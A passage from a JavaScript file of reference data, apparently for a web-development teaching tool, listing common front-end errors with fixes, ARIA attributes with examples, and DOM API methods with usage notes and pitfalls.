        '// Or async/await with try/catch:\ntry {\n  const r = await fetch("/api/data");\n  const data = await r.json();\n} catch (err) {\n  console.error(err);\n}',
        '// Always check status:\nif (!response.ok) throw new Error("Failed: " + response.status);',
      ],
      preventStrategy: 'Always handle promise rejections explicitly. Set up global error handlers.',
    },
    {
      error: 'Hydration error / mismatched markup (React)',
      severity: 'Medium',
      whatItMeans: 'Server-rendered HTML doesn\'t match client-rendered HTML.',
      commonCauses: [
        'Date.now() called on server (different than client)',
        'Math.random() on server differs from client',
        'Browser-only APIs called during server render',
        'Different data on server vs client',
      ],
      example: 'function Greeting() {\n  return <p>Today: {new Date().toLocaleDateString()}</p>;\n  // Server time != client time!\n}',
      diagnosis: [
        '1. Check what\'s different between server + client renders',
        '2. Move time-dependent code to useEffect',
        '3. Use suppressHydrationWarning carefully',
      ],
      fixes: [
        '// Hide client-only content until mounted:\nfunction Greeting() {\n  const [today, setToday] = useState(null);\n  useEffect(() => setToday(new Date().toLocaleDateString()), []);\n  return today ? <p>{today}</p> : null;\n}',
        '// Suppress (last resort):\n<p suppressHydrationWarning>Today: {new Date().toLocaleDateString()}</p>',
      ],
      preventStrategy: 'Be aware of browser-only APIs. Use useEffect for client-only logic.',
    },
    {
      error: 'Form submits and reloads page (unwanted)',
      severity: 'Medium',
      whatItMeans: 'Browser\'s default form behavior is taking effect.',
      commonCauses: [
        'No event.preventDefault() in handler',
        'Submit button with type="submit" (default)',
        'Enter key in input triggers submit',
      ],
      example: 'document.querySelector("form").addEventListener("submit", function() {\n  console.log("submit"); // Runs, but page reloads after!\n});',
      diagnosis: [
        '1. Check if you call preventDefault()',
        '2. Check button types',
        '3. Verify event listener is on form, not button',
      ],
      fixes: [
        '// Prevent default:\nform.addEventListener("submit", function(e) {\n  e.preventDefault();\n  // Your logic here\n});',
        '// Or use button click instead of form submit:\n<button type="button" onclick="...">Submit</button>',
      ],
      preventStrategy: 'Always preventDefault on form submit if you\'re handling client-side.',
    },
    {
      error: 'Click handler fires twice',
      severity: 'Medium',
      whatItMeans: 'addEventListener called multiple times on the same element.',
      commonCauses: [
        'Re-rendering pattern with vanilla JS',
        'Calling registration function twice',
        'Event bubbling not stopped',
        'Multiple event listeners on overlapping elements',
      ],
      example: 'function render() {\n  document.getElementById("btn").addEventListener("click", handler);\n  // Each render adds another listener!\n}',
      diagnosis: [
        '1. Check if addEventListener is in a function that runs multiple times',
        '2. Check for event.stopPropagation()',
        '3. Check for multiple registrations',
      ],
      fixes: [
        '// Move outside re-render:\ndocument.getElementById("btn").addEventListener("click", handler);\n// Call render() multiple times → only one listener',
        '// Or remove before adding:\nbtn.removeEventListener("click", handler);\nbtn.addEventListener("click", handler);',
        '// Use event delegation instead:\nparent.addEventListener("click", function(e) {\n  if (e.target.matches("button")) handler(e);\n});',
      ],
      preventStrategy: 'Register listeners ONCE on page load, not inside render functions. Use event delegation for dynamic content.',
    },
  ];

  // ─── ARIA attributes reference (verbose) ──────────────────────────
  var ARIA_REFERENCE = [
    {
      attribute: 'aria-label',
      type: 'Property',
      whatItDoes: 'Provides an accessible name for an element when there\'s no visible label.',
      values: 'String',
      whenUse: 'For icon-only buttons, ambiguous elements, where visible text isn\'t enough.',
      whenAvoid: 'When visible label exists (use that instead).',
      example: '<button aria-label="Close dialog">×</button>\n<input type="search" aria-label="Search products">\n<div role="button" aria-label="Toggle menu">≡</div>',
      whatScreenReaderHears: 'The aria-label text replaces the visible text/icon for assistive tech.',
      gotchas: 'Visible text + aria-label conflict (aria-label wins for AT). Don\'t use both unless intentional.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-labelledby',
      type: 'Property',
      whatItDoes: 'References ID(s) of element(s) that provide the accessible name.',
      values: 'Space-separated IDs',
      whenUse: 'When visible label exists elsewhere on page.',
      whenAvoid: 'When you can use <label for>.',
      example: '<h2 id="modal-title">Confirm Delete</h2>\n<div role="dialog" aria-labelledby="modal-title">\n  ...\n</div>\n\n<!-- Multiple references combine: -->\n<div role="region" aria-labelledby="h1 h2">\n<h1 id="h1">Site Name</h1>\n<h2 id="h2">Product Page</h2>\n</div>',
      whatScreenReaderHears: 'Combines text of referenced elements as the name.',
      gotchas: 'Referenced element must exist on page. Hidden elements still work.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-describedby',
      type: 'Property',
      whatItDoes: 'Provides additional descriptive text via ID reference.',
      values: 'Space-separated IDs',
      whenUse: 'For supplementary info (help text, error messages, descriptions).',
      whenAvoid: 'For primary labels (use aria-label or visible <label>).',
      example: '<label for="password">Password</label>\n<input type="password" id="password" aria-describedby="pwd-hint">\n<span id="pwd-hint">Must be at least 8 characters.</span>\n\n<!-- For errors: -->\n<input aria-describedby="email-error" aria-invalid="true">\n<span id="email-error" role="alert">Email is required</span>',
      whatScreenReaderHears: 'Reads the description AFTER the element\'s name.',
      gotchas: 'Description is announced after a brief pause. Don\'t use for critical info.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-expanded',
      type: 'State',
      whatItDoes: 'Indicates whether a collapsible element is currently expanded.',
      values: 'true | false | undefined',
      whenUse: 'On accordion headers, dropdowns, tree nodes, menu buttons.',
      whenAvoid: 'On always-visible content.',
      example: '<button aria-expanded="false" aria-controls="menu">Menu</button>\n<ul id="menu" hidden>\n  <li>Item 1</li>\n</ul>\n\n<script>\nbtn.addEventListener("click", () => {\n  const expanded = btn.getAttribute("aria-expanded") === "true";\n  btn.setAttribute("aria-expanded", !expanded);\n  menu.hidden = expanded;\n});\n</script>',
      whatScreenReaderHears: '"Button, collapsed" or "Button, expanded"',
      gotchas: 'Must update dynamically when state changes.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-hidden',
      type: 'State',
      whatItDoes: 'Hides element from assistive technology (but keeps visible).',
      values: 'true | false',
      whenUse: 'For decorative icons, off-screen content with focus excluded.',
      whenAvoid: 'On focusable elements (creates broken UX). On content users need.',
      example: '<button>\n  <svg aria-hidden="true" focusable="false">...</svg>\n  Save\n</button>\n\n<!-- For decorative icons paired with text -->\n<span aria-hidden="true">🎉</span>\n<span>Congratulations!</span>',
      whatScreenReaderHears: 'Nothing — element + descendants are invisible to AT.',
      gotchas: 'Critical bug: aria-hidden on focusable elements creates "ghost focus" — keyboard users can land there but AT doesn\'t announce it.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-live',
      type: 'Property',
      whatItDoes: 'Designates a region that announces dynamic content changes.',
      values: 'polite | assertive | off',
      whenUse: 'Status updates, error messages, search results count, etc.',
      whenAvoid: 'For initial page load content. For non-essential frequent updates.',
      example: '<!-- Polite: waits for AT to finish current speech -->\n<div aria-live="polite" id="status">\n  Searching...\n</div>\n\n<!-- Assertive: interrupts current speech -->\n<div role="alert" aria-live="assertive" id="error">\n  Connection lost!\n</div>\n\n<script>\n// Update content; screen reader announces:\ndocument.getElementById("status").textContent = "Found 5 results";\n</script>',
      whatScreenReaderHears: 'Polite: waits. Assertive: interrupts. Off: not announced.',
      gotchas: 'Don\'t set aria-live on element that always exists — use role="status" or role="alert". Or use aria-live on a container that gets text inserted.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-checked',
      type: 'State',
      whatItDoes: 'Indicates checked state for checkboxes, radios, switches.',
      values: 'true | false | mixed',
      whenUse: 'On custom checkboxes/switches/radio groups.',
      whenAvoid: 'On native <input type="checkbox"> (already implicit).',
      example: '<div role="checkbox" aria-checked="false" tabindex="0">Custom checkbox</div>\n\n<!-- For tri-state (e.g., parent of partial children): -->\n<div role="checkbox" aria-checked="mixed">Select All</div>',
      whatScreenReaderHears: '"Checkbox checked" or "Checkbox unchecked" or "Checkbox partially checked"',
      gotchas: 'Don\'t override native form elements that handle this automatically.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-pressed',
      type: 'State',
      whatItDoes: 'Indicates pressed state for toggle buttons.',
      values: 'true | false | mixed',
      whenUse: 'On toggle buttons (e.g., Bold/Italic toolbar).',
      whenAvoid: 'For regular buttons that aren\'t toggles.',
      example: '<button aria-pressed="false" onclick="toggle(this)">\n  Bold\n</button>\n\n<script>\nfunction toggle(btn) {\n  const pressed = btn.getAttribute("aria-pressed") === "true";\n  btn.setAttribute("aria-pressed", !pressed);\n}\n</script>',
      whatScreenReaderHears: '"Toggle button pressed" or "Toggle button not pressed"',
      gotchas: 'Different from aria-expanded — aria-pressed is for toggle state, aria-expanded for show/hide.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-disabled',
      type: 'State',
      whatItDoes: 'Indicates that element is disabled (visually + functionally).',
      values: 'true | false',
      whenUse: 'On custom elements that aren\'t natively disableable.',
      whenAvoid: 'On native inputs (use disabled attribute).',
      example: '<button aria-disabled="true">Save</button>\n\n<!-- For native, prefer: -->\n<button disabled>Save</button>',
      whatScreenReaderHears: '"Button disabled" or "Button"',
      gotchas: 'aria-disabled keeps focusable (different from disabled attribute which removes from tab order).',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-invalid',
      type: 'State',
      whatItDoes: 'Indicates form field has invalid value.',
      values: 'true | false | grammar | spelling',
      whenUse: 'For form inputs after validation.',
      whenAvoid: 'On unvalidated inputs.',
      example: '<label for="email">Email</label>\n<input type="email" id="email" required\n       aria-invalid="false">\n\n<!-- After failed validation: -->\n<input type="email" id="email" required\n       aria-invalid="true"\n       aria-describedby="email-err">\n<span id="email-err" role="alert">Invalid email format</span>',
      whatScreenReaderHears: '"Invalid" + reads aria-describedby content',
      gotchas: 'Don\'t set true on initial render. Set after validation.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-required',
      type: 'Property',
      whatItDoes: 'Indicates form field is required.',
      values: 'true | false',
      whenUse: 'On form fields without the required attribute.',
      whenAvoid: 'On required="required" already-set inputs.',
      example: '<label for="name">Name</label>\n<input type="text" id="name" aria-required="true">\n\n<!-- Better (HTML5): -->\n<input type="text" id="name" required>',
      whatScreenReaderHears: '"Required"',
      gotchas: 'Native required is preferable when possible.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-current',
      type: 'Property',
      whatItDoes: 'Indicates "current" item in a set (current page, step, etc).',
      values: 'page | step | location | date | time | true | false',
      whenUse: 'In breadcrumbs, multi-step forms, current navigation item.',
      whenAvoid: 'For non-set elements.',
      example: '<!-- Current page in nav -->\n<nav>\n  <a href="/" aria-current="page">Home</a>\n  <a href="/about">About</a>\n</nav>\n\n<!-- Current step -->\n<ol>\n  <li aria-current="step">Step 1</li>\n  <li>Step 2</li>\n</ol>',
      whatScreenReaderHears: '"current page" or "current step"',
      gotchas: 'Different from aria-selected (which is for selection state).',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'role',
      type: 'Property',
      whatItDoes: 'Defines the semantic role of an element when HTML doesn\'t.',
      values: 'Various: alert, button, dialog, navigation, region, etc.',
      whenUse: 'For custom widgets when no native HTML element fits.',
      whenAvoid: 'When native HTML element exists (use that instead).',
      example: '<div role="alert">Warning! Saving failed.</div>\n<div role="button" tabindex="0" onclick="...">Click me</div>\n<div role="region" aria-label="Main content">...</div>',
      whatScreenReaderHears: 'The role name as part of the element\'s description',
      gotchas: 'Use native elements first. Role is for custom widgets.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-controls',
      type: 'Property',
      whatItDoes: 'Identifies the element that another element controls.',
      values: 'IDs of controlled elements',
      whenUse: 'For elements that show/hide or modify other elements (toggle, accordion).',
      whenAvoid: 'For purely independent elements.',
      example: '<button aria-expanded="false" aria-controls="menu">Menu</button>\n<ul id="menu" hidden>...</ul>\n\n<!-- For tabs: -->\n<div role="tablist">\n  <button role="tab" aria-selected="true" aria-controls="panel-1">Tab 1</button>\n</div>\n<div id="panel-1" role="tabpanel">Content</div>',
      whatScreenReaderHears: 'Not directly announced; helps AT understand structure.',
      gotchas: 'Should reference elements that actually exist.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-owns',
      type: 'Property',
      whatItDoes: 'Defines a parent/child relationship that doesn\'t exist in DOM.',
      values: 'IDs of "owned" elements',
      whenUse: 'When you need to create a parent-child relationship for AT purposes.',
      whenAvoid: 'When you can restructure DOM correctly.',
      example: '<!-- Owning element is parent in AT but not DOM -->\n<div role="tree" aria-owns="branch1 branch2">\n</div>\n<div id="branch1" role="treeitem">Branch 1</div>\n<div id="branch2" role="treeitem">Branch 2</div>',
      whatScreenReaderHears: 'Treats elements as nested children of owning element.',
      gotchas: 'Can break tab order. Use sparingly. Prefer DOM structure.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-haspopup',
      type: 'Property',
      whatItDoes: 'Indicates the element opens a popup of some kind.',
      values: 'false | true | menu | listbox | tree | grid | dialog',
      whenUse: 'For buttons that open menus, dropdowns, dialogs.',
      whenAvoid: 'For regular buttons.',
      example: '<button aria-haspopup="menu" aria-expanded="false">Options</button>\n<button aria-haspopup="dialog">Edit profile</button>',
      whatScreenReaderHears: '"has popup menu" or "opens dialog"',
      gotchas: 'Combine with aria-expanded to communicate state.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-modal',
      type: 'Property',
      whatItDoes: 'Indicates a dialog is modal (blocks interaction with rest of page).',
      values: 'true | false',
      whenUse: 'On modal dialogs.',
      whenAvoid: 'On non-modal popovers.',
      example: '<div role="dialog" aria-modal="true" aria-labelledby="dialog-title">\n  <h2 id="dialog-title">Confirm</h2>\n  <p>Are you sure?</p>\n  <button>Yes</button>\n  <button>No</button>\n</div>',
      whatScreenReaderHears: 'Communicates modal nature. Some AT trap focus automatically.',
      gotchas: 'aria-modal alone doesn\'t trap focus — must also implement focus trap in JS.',
      browserSupport: 'All modern browsers + AT',
    },
    {
      attribute: 'aria-busy',
      type: 'State',
      whatItDoes: 'Indicates an element is being updated.',
      values: 'true | false',
      whenUse: 'During loading states. AT may pause until busy=false.',
      whenAvoid: 'For very short delays.',
      example: '<div aria-busy="true" aria-live="polite">\n  Loading...\n</div>\n\n// After data loads:\nel.setAttribute("aria-busy", "false");\nel.textContent = "Loaded 5 items";',
      whatScreenReaderHears: 'Some AT delay updates until aria-busy is false.',
      gotchas: 'Use sparingly. Most loading states don\'t need this.',
      browserSupport: 'All modern browsers + AT',
    },
  ];

  // ─── DOM API reference (every key DOM method, verbose) ────────────
  var DOM_API_REFERENCE = [
    {
      method: 'document.getElementById()',
      whatItDoes: 'Finds an element by its id attribute.',
      returns: 'Element or null',
      params: 'id (string)',
      example: '// HTML: <div id="myBtn">Click</div>\nconst btn = document.getElementById("myBtn");\nbtn.style.color = "red";',
      whenUse: 'When you know the exact id.',
      whenAvoid: 'For multiple elements (use querySelectorAll). For dynamic content where id may change.',
      a11yNotes: 'No direct accessibility impact.',
      browserSupport: 'All browsers',
      commonMistakes: ['Forgetting the # in CSS but adding it here', 'Element doesn\'t exist yet (script before DOM)'],
    },
    {
      method: 'document.querySelector()',
      whatItDoes: 'Returns the FIRST element matching a CSS selector.',
      returns: 'Element or null',
      params: 'CSS selector (string)',
      example: '// Various selectors:\nconst first = document.querySelector(".active");\nconst child = document.querySelector("article > p");\nconst attr = document.querySelector("[data-toggle]");',
      whenUse: 'When you want the first match. CSS selectors are powerful.',
      whenAvoid: 'When you need all matches (use querySelectorAll).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Forgetting selector syntax (.class vs #id vs tag)', 'Selector matches nothing → returns null → null reference error'],
    },
    {
      method: 'document.querySelectorAll()',
      whatItDoes: 'Returns all elements matching a CSS selector.',
      returns: 'NodeList (array-like, but not array)',
      params: 'CSS selector (string)',
      example: 'const items = document.querySelectorAll(".item");\nitems.forEach(item => {\n  item.classList.add("processed");\n});\n\n// Convert to array if needed:\nconst arr = Array.from(items);\nconst arr2 = [...items];',
      whenUse: 'When you need all matching elements.',
      whenAvoid: 'When you need just one (use querySelector).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Trying to use array methods directly (NodeList is not an array)', 'NodeList is static — doesn\'t auto-update'],
    },
    {
      method: 'element.addEventListener()',
      whatItDoes: 'Attaches an event handler to an element.',
      returns: 'undefined',
      params: 'event type, callback, options',
      example: 'btn.addEventListener("click", function(e) {\n  console.log("clicked!", e);\n});\n\n// With options:\nbtn.addEventListener("click", handler, {\n  once: true,    // Auto-remove after firing once\n  capture: false, // Bubble phase (default)\n  passive: true   // Won\'t call preventDefault\n});\n\n// Remove:\nbtn.removeEventListener("click", handler);',
      whenUse: 'For any user interaction or DOM event.',
      whenAvoid: 'Multiple registrations of same handler accidentally',
      a11yNotes: 'Works with keyboard events too. Keep event handling consistent.',
      browserSupport: 'All browsers (IE9+)',
      commonMistakes: ['Anonymous function can\'t be removed', 'Forgetting to remove listeners (memory leak)', 'Handler called twice (registered twice)'],
    },
    {
      method: 'element.removeEventListener()',
      whatItDoes: 'Removes a previously added event handler.',
      returns: 'undefined',
      params: 'event type, exact same callback function',
      example: 'function handler() { console.log("click"); }\nbtn.addEventListener("click", handler);\n// Later:\nbtn.removeEventListener("click", handler);\n\n// IMPORTANT: must be the SAME function reference\n// This won\'t work:\nbtn.addEventListener("click", () => console.log("hi"));\nbtn.removeEventListener("click", () => console.log("hi")); // different functions',
      whenUse: 'Cleaning up listeners on component unmount, etc.',
      whenAvoid: 'When you used an anonymous function in addEventListener (can\'t remove).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All browsers',
      commonMistakes: ['Trying to remove anonymous function', 'Forgetting to remove listeners (memory leak)'],
    },
    {
      method: 'element.classList',
      whatItDoes: 'Modify element CSS classes programmatically.',
      returns: 'DOMTokenList',
      params: 'Various methods: .add(), .remove(), .toggle(), .contains(), .replace()',
      example: 'el.classList.add("active");\nel.classList.remove("hidden");\nel.classList.toggle("open"); // adds if missing, removes if present\n\nconst isOpen = el.classList.contains("open");\nif (isOpen) { /* ... */ }\n\nel.classList.replace("old", "new");',
      whenUse: 'Modifying CSS classes from JavaScript.',
      whenAvoid: 'Setting className directly (overwrites all classes).',
      a11yNotes: 'Classes don\'t affect accessibility tree, but their resulting styles can.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Setting el.className = "active" wipes out other classes', 'Forgetting that .contains is case-sensitive'],
    },
    {
      method: 'element.innerHTML',
      whatItDoes: 'Get/set HTML content of element.',
      returns: 'String (HTML)',
      params: 'String (HTML) when setting',
      example: '// Get:\nconst html = el.innerHTML; // "<p>Hello</p>"\n\n// Set:\nel.innerHTML = "<strong>Bold!</strong>";\n\n// XSS RISK:\nel.innerHTML = userInput; // DANGEROUS!\n\n// Safe:\nel.textContent = userInput; // Escapes HTML',
      whenUse: 'Setting HTML you control (not user input).',
      whenAvoid: 'WITH USER INPUT (XSS vulnerability).',
      a11yNotes: 'Replaces all children — can disrupt focus + screen reader state.',
      browserSupport: 'All browsers',
      commonMistakes: ['XSS injection via user input', 'Destroying event listeners on children'],
    },
    {
      method: 'element.textContent',
      whatItDoes: 'Get/set text content (HTML-escaped).',
      returns: 'String',
      params: 'String when setting',
      example: '// Get:\nconst text = el.textContent; // Plain text, no HTML\n\n// Set (safe!):\nel.textContent = userInput; // HTML chars are escaped\n\n// Compared to innerText:\n// innerText respects CSS (display:none → not included)\n// textContent gets ALL text regardless of display',
      whenUse: 'When dealing with text content (most common case).',
      whenAvoid: 'When you actually need HTML interpretation.',
      a11yNotes: 'Text changes are announced to screen readers via aria-live if configured.',
      browserSupport: 'All browsers',
      commonMistakes: ['Confusing with innerText (subtle differences)'],
    },
    {
      method: 'document.createElement()',
      whatItDoes: 'Creates a new HTML element.',
      returns: 'New element (detached)',
      params: 'tag name (string)',
      example: 'const div = document.createElement("div");\ndiv.textContent = "Hello!";\ndiv.classList.add("greeting");\n\n// Attach to DOM:\ndocument.body.appendChild(div);\n\n// Or:\nparent.append(div); // Modern alternative\n\n// Detached → not yet visible. Add to DOM to display.',
      whenUse: 'When building DOM dynamically.',
      whenAvoid: 'When templates would be cleaner (use template tags).',
      a11yNotes: 'New elements are part of accessibility tree once attached.',
      browserSupport: 'All browsers',
      commonMistakes: ['Forgetting to attach to DOM (invisible)', 'Memory leaks if not properly detached'],
    },
    {
      method: 'element.appendChild() / element.append()',
      whatItDoes: 'Adds child elements at the end.',
      returns: 'appendChild: child. append: undefined.',
      params: 'appendChild: 1 child. append: multiple children + strings.',
      example: '// Modern:\nparent.append(child1, child2, "some text");\n\n// Older:\nparent.appendChild(child); // 1 element only\n\n// Prepend (at start):\nparent.prepend(child); // Modern\nparent.insertBefore(child, parent.firstChild); // Older',
      whenUse: 'Adding elements to DOM.',
      whenAvoid: 'When you need to insert at specific position (use insertBefore).',
      a11yNotes: 'New content is announced to screen readers if in aria-live region.',
      browserSupport: 'append: modern browsers. appendChild: all browsers.',
      commonMistakes: ['appendChild moves elements rather than copying (no error, just moves)', 'Forgetting that returns are different'],
    },
    {
      method: 'element.removeChild() / element.remove()',
      whatItDoes: 'Removes element from DOM.',
      returns: 'removeChild: removed element. remove: undefined.',
      params: 'removeChild: child. remove: none.',
      example: '// Modern:\nelement.remove();\n\n// Older:\nparent.removeChild(child);',
      whenUse: 'Removing elements from DOM.',
      whenAvoid: 'When you might re-add later (consider hiding instead).',
      a11yNotes: 'Removal is announced to screen readers if in aria-live region.',
      browserSupport: 'remove: modern. removeChild: all browsers.',
      commonMistakes: ['Memory leaks if element has listeners that aren\'t cleaned up'],
    },
    {
      method: 'element.setAttribute() / getAttribute()',
      whatItDoes: 'Set or get HTML attributes.',
      returns: 'setAttribute: undefined. getAttribute: string or null.',
      params: 'Attribute name, value',
      example: 'btn.setAttribute("aria-label", "Close");\nbtn.setAttribute("data-id", "123");\nconst label = btn.getAttribute("aria-label");\nbtn.removeAttribute("disabled");\n\n// For data attributes, you can also use dataset:\nbtn.dataset.id = "123"; // Sets data-id\nconst id = btn.dataset.id;',
      whenUse: 'Setting/getting any attribute, especially custom (data-*).',
      whenAvoid: 'For property like value (use el.value instead).',
      a11yNotes: 'ARIA attributes set this way affect accessibility tree.',
      browserSupport: 'All browsers',
      commonMistakes: ['Confusing attribute vs property (e.g., el.checked vs el.getAttribute("checked"))', 'Using setAttribute for inline styles (less efficient than style property)'],
    },
    {
      method: 'window.scrollTo() / element.scrollIntoView()',
      whatItDoes: 'Scroll page or scroll element into view.',
      returns: 'undefined',
      params: 'Options object',
      example: '// Scroll to top:\nwindow.scrollTo({top: 0, behavior: "smooth"});\n\n// Scroll element into view:\nelement.scrollIntoView({behavior: "smooth", block: "start"});\n\n// Standard behavior:\nwindow.scrollTo(0, 500); // x, y',
      whenUse: 'After form submission, navigation, etc.',
      whenAvoid: 'In ways that disorient users (sudden scrolls).',
      a11yNotes: 'Honor prefers-reduced-motion. Don\'t auto-scroll without good reason.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Scrolling without reduced-motion respect', 'Auto-scrolling can be disorienting'],
    },
    {
      method: 'element.style',
      whatItDoes: 'Get/set inline CSS styles.',
      returns: 'CSSStyleDeclaration object',
      params: 'Various: el.style.property = "value"',
      example: 'el.style.color = "red";\nel.style.backgroundColor = "blue"; // camelCase for hyphenated\nel.style.borderRadius = "8px";\n\n// Multiple at once:\nObject.assign(el.style, {\n  color: "red",\n  fontSize: "20px"\n});\n\n// CSS variable:\nel.style.setProperty("--primary", "#2563eb");',
      whenUse: 'For dynamic styles that change at runtime.',
      whenAvoid: 'For static styles (use CSS classes). Static styles in CSS are more maintainable.',
      a11yNotes: 'Inline styles can be overridden by user style sheets.',
      browserSupport: 'All browsers',
      commonMistakes: ['Inline styling everything (becomes hard to maintain)', 'CSS units vs no units (some need "px")'],
    },
    {
      method: 'element.offsetWidth / offsetHeight',
      whatItDoes: 'Get rendered dimensions of element including borders.',
      returns: 'Number (pixels)',
      params: 'None',
      example: 'console.log(el.offsetWidth); // 200\nconsole.log(el.offsetHeight); // 100\n\n// Distinct:\n// offsetWidth/Height: includes border + padding\n// clientWidth/Height: includes padding (no border)\n// scrollWidth/Height: total scrollable (including hidden)\n// getBoundingClientRect(): more precise',
      whenUse: 'Getting actual rendered size.',
      whenAvoid: 'In a tight loop (triggers layout reflow each read).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All browsers',
      commonMistakes: ['Layout thrashing: alternating reads + writes triggers many reflows'],
    },
    {
      method: 'element.getBoundingClientRect()',
      whatItDoes: 'Returns precise rendered position + size.',
      returns: 'DOMRect with x, y, width, height, top, right, bottom, left',
      params: 'None',
      example: 'const rect = el.getBoundingClientRect();\nconsole.log(rect.top, rect.left, rect.width, rect.height);\n\n// Check if element is visible:\nfunction isVisible(el) {\n  const rect = el.getBoundingClientRect();\n  return rect.bottom >= 0 && rect.right >= 0 &&\n         rect.top <= window.innerHeight && rect.left <= window.innerWidth;\n}',
      whenUse: 'Precise positioning. Visibility checks.',
      whenAvoid: 'In tight loops (causes layout).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All browsers',
      commonMistakes: ['Calling many times in a loop'],
    },
    {
      method: 'document.cookie',
      whatItDoes: 'Read/write browser cookies.',
      returns: 'Cookie string (when reading)',
      params: 'Cookie string when setting',
      example: '// Read:\nconsole.log(document.cookie); // "name=value; other=value"\n\n// Write:\ndocument.cookie = "username=Alice; expires=...";\n\n// Note: clunky API. Modern apps prefer localStorage + httpOnly cookies for auth.',
      whenUse: 'When you need cookies specifically.',
      whenAvoid: 'For sensitive data (use httpOnly cookies from server).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All browsers',
      commonMistakes: ['Storing sensitive data in client-readable cookies', 'Cookie format is awkward to parse'],
    },
    {
      method: 'localStorage / sessionStorage',
      whatItDoes: 'Client-side storage. localStorage persists; sessionStorage tab-only.',
      returns: 'String',
      params: 'key, value (strings)',
      example: '// Set:\nlocalStorage.setItem("user", "Alice");\n\n// Get:\nconst name = localStorage.getItem("user");\n\n// Remove:\nlocalStorage.removeItem("user");\n\n// Clear all:\nlocalStorage.clear();\n\n// For objects:\nlocalStorage.setItem("data", JSON.stringify({a: 1, b: 2}));\nconst data = JSON.parse(localStorage.getItem("data"));\n\n// Capacity: ~5MB per origin',
      whenUse: 'Persisting user preferences, draft data, theme.',
      whenAvoid: 'Sensitive data (XSS risk). Large data (consider IndexedDB).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Storing non-string (gets converted to "[object Object]")', 'XSS-vulnerable code can steal localStorage'],
    },
    {
      method: 'window.location',
      whatItDoes: 'Access + modify current URL.',
      returns: 'Location object',
      params: 'Various properties',
      example: '// Read:\nwindow.location.href; // Full URL\nwindow.location.hostname; // "example.com"\nwindow.location.pathname; // "/path"\nwindow.location.search; // "?q=hello"\nwindow.location.hash; // "#section"\n\n// Navigate:\nwindow.location.href = "/other-page"; // Full navigation\nwindow.location.replace("/replacement"); // Replace history\nwindow.location.reload(); // Refresh',
      whenUse: 'Navigation control. Reading URL parameters.',
      whenAvoid: 'For client-side routing (use History API).',
      a11yNotes: 'Auto-navigation can disorient. Always explicit user action.',
      browserSupport: 'All browsers',
      commonMistakes: ['Auto-redirecting on page load (disorienting)', 'Not encoding URL parameters'],
    },
    {
      method: 'window.history',
      whatItDoes: 'Browser history management. Push state without page reload.',
      returns: 'Various methods',
      params: 'Varies',
      example: '// Push new history entry:\nhistory.pushState({page: 1}, "Title", "/page1");\n\n// Replace current entry:\nhistory.replaceState({}, "Title", "/page2");\n\n// Listen for back/forward:\nwindow.addEventListener("popstate", function(e) {\n  console.log("State:", e.state);\n});\n\n// Go back:\nhistory.back();\nhistory.forward();',
      whenUse: 'Single-page applications. Client-side routing.',
      whenAvoid: 'Old-style multi-page apps.',
      a11yNotes: 'Changing URL alone doesn\'t announce navigation. Update <title> + focus management.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Not updating <title> on route change', 'Not managing focus after navigation'],
    },
    {
      method: 'requestAnimationFrame()',
      whatItDoes: 'Schedule a function to run before next browser repaint.',
      returns: 'Request ID',
      params: 'Callback function',
      example: 'function animate() {\n  // Update something\n  ball.x += 5;\n  ball.draw();\n  \n  if (ball.x < 500) requestAnimationFrame(animate);\n}\nrequestAnimationFrame(animate);\n\n// Compare to setInterval:\n// requestAnimationFrame: ~60fps, syncs with display\n// setInterval(16): close but not synced',
      whenUse: 'Animations. Game loops.',
      whenAvoid: 'For one-off delays (use setTimeout).',
      a11yNotes: 'Animations should respect prefers-reduced-motion.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Forgetting to recurse (animation runs only once)', 'Performance issues if animation is heavy'],
    },
    {
      method: 'console methods (log, error, warn, info, table, time, group)',
      whatItDoes: 'Debugging output to browser console.',
      returns: 'undefined',
      params: 'Various',
      example: 'console.log("Variable:", value);\nconsole.error("Failed:", error);\nconsole.warn("Deprecated");\nconsole.info("Information");\n\n// Table format:\nconsole.table([{a: 1, b: 2}, {a: 3, b: 4}]);\n\n// Timing:\nconsole.time("operation");\n// ... do thing ...\nconsole.timeEnd("operation"); // logs duration\n\n// Grouping:\nconsole.group("Section");\nconsole.log("inside group");\nconsole.groupEnd();',
      whenUse: 'Debugging. NOT in production.',
      whenAvoid: 'In production code (clutters console + may leak info).',
      a11yNotes: 'No direct impact.',
      browserSupport: 'All browsers',
      commonMistakes: ['Leaving console.log in production', 'console.log inside loops (slows)'],
    },
    {
      method: 'navigator.geolocation',
      whatItDoes: 'Access user\'s location.',
      returns: 'undefined (uses callbacks)',
      params: 'Success callback, error callback',
